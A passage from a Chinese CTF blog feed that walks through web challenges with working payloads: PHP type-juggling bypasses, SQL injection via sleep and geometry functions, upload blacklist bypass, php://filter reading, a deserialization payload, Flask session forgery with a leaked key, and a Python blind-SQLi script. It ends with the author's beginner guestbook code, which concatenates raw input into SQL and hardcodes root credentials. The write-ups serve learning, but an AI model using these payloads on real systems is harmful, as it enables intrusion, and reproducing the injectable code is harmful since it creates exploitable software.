class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>题目要求让repo与flag字符串相等就输出flag<br>strcmp()函数也只能处理字符串参数，传个数组进去就能返回false，又由于它与0的比较用的是==  而不是  ===（允许类型转换后比较），就满足了这个 if 的条件。Payload：?repo[]=a</p><h2 id="惊鸿一笔，上官婉儿"><a href="#惊鸿一笔，上官婉儿" class="headerlink" title="惊鸿一笔，上官婉儿"></a>惊鸿一笔，上官婉儿</h2><p>这道题想了好久,union,and,=,extractvalue,被过滤<br>试了报错,不行,发现是数字型的SQL注入，尝试exp报错也不行,发现试各种报错都原样输出报错,于是尝试时间盲注</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">39.108</span><span class="number">.109</span><span class="number">.85</span>:<span class="number">9001</span>/?id=<span class="number">1</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>成功执行<br>这里要学一个函数 <strong>linestring</strong><br>linestring是Mysql自带的空间索引函数用来索引列名，还有一个函数也有这个效果<strong>polygon</strong> 这个语句进行报错<br>在mysql的security数据库users表</p><pre><code>select * from users where id=1 and linestring(id);</code></pre><p>ERROR 1367 (22007): Illegal non geometric ‘<code>security</code>.<code>users</code>.<code>id</code>‘ value found during parsing<br>payload如下:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">or</span> exp(~<span class="built_in">id</span>)</span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">or</span> linestring(<span class="built_in">id</span>)</span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">or</span> polygon(<span class="built_in">id</span>)</span><br></pre></td></tr></table></figure><h2 id="快一点"><a href="#快一点" class="headerlink" title="快一点"></a>快一点</h2><p>You need get a ‘t’<br>于是构造一个?t=1<br>得到代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'t'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $_COOKIE[<span class="string">'bash_token'</span>] = $_GET[<span class="string">'t'</span>];</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"You need get a 't'"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'sleep'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(!is_numeric($_POST[<span class="string">'sleep'</span>]))&#123;              </span></span><br><span class="line"><span class="php">                                      </span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Gime me a number plz.'</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;   </span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too short.'</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too long.'</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        sleep((int)$_POST[<span class="string">'sleep'</span>]);  </span></span><br><span class="line"><span class="php">        getFlag();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>题目要求sleep是个数字，并在2592000和7776000之间，然后sleep这么长时间，给出flag。<br>这题主要考察is_numeric()和int()的区别。前者支持普通数字型、科学记数法型、部分支持十六进制0x型，在is_numeric()支持的形式中，int()不能正确转换十六进制型、科学计数法型。<br>因此可以构造</p><pre><code>sleep = 6e6、0x4F1A01</code></pre><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>上传.php,弹出<br>alert(‘不允许的文件！’);history.go(-1)<br>改为.jpg<br>alert(‘上传成功！’);history.go(-1)<br>用于这道题没有回显上传路径<br>这道题应该是黑名单绕过<br>经过测试<br>.pht  可以绕过  ,注意还要改content-type:image/jpeg</p><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>打开访问<br>you are not admin !<br>查看源码, 发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传三个参数user、file、pass使其能通过<br>注意</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(<span class="name">isset</span>($user)<span class="symbol">&amp;&amp;</span>(<span class="name">file_get_contents</span>($user,'r')===<span class="string">"admin"</span>))</span><br></pre></td></tr></table></figure><p>利用php的封装协议php://input<br>include($file);//class.php<br>读取class.php文件和index.php文件</p><pre><code>?user=php://input&amp;file=php://filter/convert.base64-encode/resource=index.php?user=php://input&amp;file=php://filter/convert.base64-encode/resource=index.php</code></pre><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//flag.php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">        $pass = unserialize($pass);</span><br><span class="line">        <span class="keyword">echo</span> $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>源码来看这是一道反序列化题<br>构造序列化字符串然后传进去读取flag，因为他过滤了flag不能直接读取<br>?user=php://input&amp;file=class.php&amp;pass=O:4:”Read”:1:{s:4:”file”;s:57:”php://filter/read=convert.base64-encode/resource=flag.php”;}</p><p>post: admin</p><h2 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h2><p>考点：</p><p>信息泄露</p><p>flask-session伪造</p><p>delete盲注</p><p>环境：</p><p>python3环境</p><p>flask 1.0.2框架</p><p>sqlite3数据库<br>查看源码<br>注意到这个图片地址<br><a href="https://raw.githubusercontent.com/alipql/tuku/master/8856eac7gy1fkmf2o66yyj205k05kq2z.jpg" target="_blank" rel="noopener">https://raw.githubusercontent.com/alipql/tuku/master/8856eac7gy1fkmf2o66yyj205k05kq2z.jpg</a></p><p>应该是某个人的github地址<br><a href="https://github.com/alipql" target="_blank" rel="noopener">https://github.com/alipql</a><br>可以发现alipql这个人的github仓库： <a href="https://github.com/alipql" target="_blank" rel="noopener">https://github.com/alipql</a> 在homework这个库里面的homework2中可以找到一个非空的config.py配置文件</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># coding=utf<span class="number">-8</span></span><br><span class="line">import <span class="built_in">os</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Config():</span><br><span class="line">    BaseDir = <span class="built_in">os</span>.<span class="built_in">path</span>.abspath(<span class="built_in">os</span>.<span class="built_in">path</span>.dirname(__file__))</span><br><span class="line">    DB_FILE = <span class="built_in">os</span>.<span class="built_in">path</span>.join(BaseDir, <span class="string">'dbfile.sql'</span>)</span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">'sqlite:///'</span> + DB_FILE</span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = True</span><br><span class="line">    SQLALCHEMY_COMMIT_ON_TEARDOWN = True</span><br><span class="line">    SECRET_KEY = <span class="string">'dropseckey123'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">config</span> = &#123;</span><br><span class="line">    <span class="string">'default'</span>: Config</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从config.py配置文件中可得到secert_key、sql数据库类型<br>拿到secert_key后，利用它进行flask的session伪造<br>工具地址:<br><a href="https://github.com/style-404/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/style-404/flask-session-cookie-manager</a><br>题目中预制的有两个用户，test/test,user/user,可通过登录用户时返回的session验证SECRETKEY是否正确<br>可以利用，然后去伪造admin的session<br>替换掉session，即可成功登录到admin账户获取管理权限。</p><p>tip: 存在一个flag表和flag字段<br>于是进行<strong>delete布尔盲注</strong></p><p>对添加用户功能和删除用户功能稍微一测试，会发现删除用户功能是存在注入的，是delete的注入。从config.py的信息泄露中可以知道数据库为sqlite，导致很多函数不能用；由于又是个delete方式，导致很多姿势用不上。</p><p>在这里轻微fuzz一下可发现只过滤了drop、update、delete等部分删表删flag改flag的关键字，而and、substr、selete、from、空格等未过滤，参数为单引号包裹，所以可组合一个payload:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' <span class="keyword">and</span> substr((<span class="keyword">select</span> flag from flag),<span class="number">1</span>,<span class="number">1</span>)==<span class="symbol">'f</span></span><br></pre></td></tr></table></figure><p>先增加用户，在删除用户时提交payload再进行布尔判断即可盲注flag。 例如增加111用户后再删除用户111</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usernamedel=<span class="number">111</span>' and substr((select flag from flag ),<span class="number">1</span>,<span class="number">1</span>)=='f</span><br><span class="line">成功删除用户，返回包不存在<span class="number">111</span>，说明flag第一个字母为f。若改为</span><br><span class="line">usernamedel=<span class="number">111</span>' and substr((select flag from flag),<span class="number">1</span>,<span class="number">1</span>)=='<span class="number">0</span></span><br></pre></td></tr></table></figure><p>显示成功删除却依然存在111用户，没删除用户，说明第一位不为0，然后接下来写脚本去跑就行了</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sqliexp</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.url = <span class="string">'http://172.93.39.218:8888/admin'</span></span><br><span class="line">        <span class="keyword">self</span>.session = <span class="string">'eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sIm5hbWUiOiJhZG1pbiJ9.XB-iXg.PURonzshjlDsEvsXYZ24YyuAgI4'</span></span><br><span class="line">        <span class="keyword">self</span>.flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#增加111用户</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">adduser</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        cookies = &#123;<span class="string">'session'</span><span class="symbol">:self</span>.session&#125;</span><br><span class="line">        data = &#123;<span class="string">'username'</span><span class="symbol">:<span class="string">'111'</span></span>,<span class="string">'password'</span><span class="symbol">:<span class="string">'111'</span></span>&#125;</span><br><span class="line">        <span class="symbol">try:</span></span><br><span class="line">            requests.post(url=<span class="keyword">self</span>.url, cookies=cookies,data=data)</span><br><span class="line">        except <span class="symbol">TimeoutError:</span></span><br><span class="line">            exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deluser</span><span class="params">(<span class="keyword">self</span>,num)</span></span><span class="symbol">:</span></span><br><span class="line">        cookies = &#123;<span class="string">'session'</span><span class="symbol">:self</span>.session&#125;</span><br><span class="line">        <span class="keyword">for</span> strs <span class="keyword">in</span> <span class="string">'flag&#123;&#125;0123456789bcde'</span><span class="symbol">:</span></span><br><span class="line">            payload = <span class="string">"111' and substr((select flag from flag),%d,1)=='%s"</span> % (num,strs)</span><br><span class="line">            data = &#123;<span class="string">'usernamedel'</span><span class="symbol">:payload</span>&#125;</span><br><span class="line">            <span class="symbol">try:</span></span><br><span class="line">                response = requests.post(url=<span class="keyword">self</span>.url,data=data,cookies=cookies)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'111'</span> <span class="keyword">not</span> <span class="keyword">in</span> response.<span class="symbol">text:</span></span><br><span class="line">                    <span class="keyword">self</span>.flag += strs</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">            except <span class="symbol">TimeoutError:</span></span><br><span class="line">                exit(-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span><span class="symbol">:</span></span><br><span class="line">    exp = sqliexp()</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">39</span>,<span class="number">1</span>)<span class="symbol">:</span></span><br><span class="line">        exp.adduser()</span><br><span class="line">        exp.deluser(num)</span><br><span class="line">        print(exp.flag)</span><br></pre></td></tr></table></figure><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h2 id="中原工学院图书馆"><a href="#中原工学院图书馆" class="headerlink" title="中原工学院图书馆"></a>中原工学院图书馆</h2><p>看WP说这道题特别简单,用binwalk得到一个压缩包，发现一张图片。flag正确格式是drops{}，对图片中的密文进行rot13解密就拿到flag了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>初写留言板</title>
      <link href="/2018/12/23/%E5%88%9D%E5%86%99%E7%95%99%E8%A8%80%E6%9D%BF/"/>
      <url>/2018/12/23/%E5%88%9D%E5%86%99%E7%95%99%E8%A8%80%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="第一次的留言板"><a href="#第一次的留言板" class="headerlink" title="第一次的留言板"></a>第一次的留言板</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一次写留言板,真的好辛苦,几分钟看懂的代码自己一个个敲花了一下午</span><br><span class="line">体会到开发的痛苦了,希望自己以后可以多写东西出来</span><br></pre></td></tr></table></figure><h2 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>留言板<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"list.php"</span>&gt;</span>浏览留言<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"Post"</span> <span class="attr">action</span>=<span class="string">"add.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span>&gt;</span>用户:<span class="tag">&lt;<span class="name">br</span>&gt;</span> <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">style</span>=<span class="string">"width=350px"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">标题:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"title"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">内容:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"发布留言"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="add-php"><a href="#add-php" class="headerlink" title="add.php"></a>add.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">header(<span class="string">"charset=utf8"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span></span><br><span class="line"><span class="php">$user = $_POST[<span class="string">'user'</span>];</span></span><br><span class="line"><span class="php">$title = $_POST[<span class="string">'title'</span>];</span></span><br><span class="line"><span class="php">$content = $_POST[<span class="string">'content'</span>];</span></span><br><span class="line"><span class="php">var_dump($user.$title.$content);</span></span><br><span class="line"><span class="php">$sql = <span class="string">"insert into message (user,title,content) values ('$user','$title','$content')"</span>;</span></span><br><span class="line"><span class="php">$row = mysql_query($sql);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($row)&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('插入成功');window.history.go(-1);&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="conn-php"><a href="#conn-php" class="headerlink" title="conn.php"></a>conn.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php">$host = <span class="string">'localhost'</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">'root'</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">'root'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$conn = mysql_connect($host,$username,$password);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$conn)&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">"连接失败"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">mysql_select_db(<span class="string">"bbs"</span>,$conn);</span></span><br><span class="line"><span class="php">mysql_query(<span class="string">"set names utf8"</span>);</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="del-php"><a href="#del-php" class="headerlink" title="del.php"></a>del.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">header(<span class="string">"content-type:text/html,charset='utf-8'"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'list.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'conn.php'</span>);</span></span><br><span class="line"><span class="php">$id = $_GET[<span class="string">'id'</span>];</span></span><br><span class="line"><span class="php">$sql = <span class="string">"delete from message where id="</span>.$id;</span></span><br><span class="line"><span class="php">$result = mysql_query($sql);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($result)&#123;</span></span><br><span class="line"><span class="php"> <span class="keyword">echo</span> <span 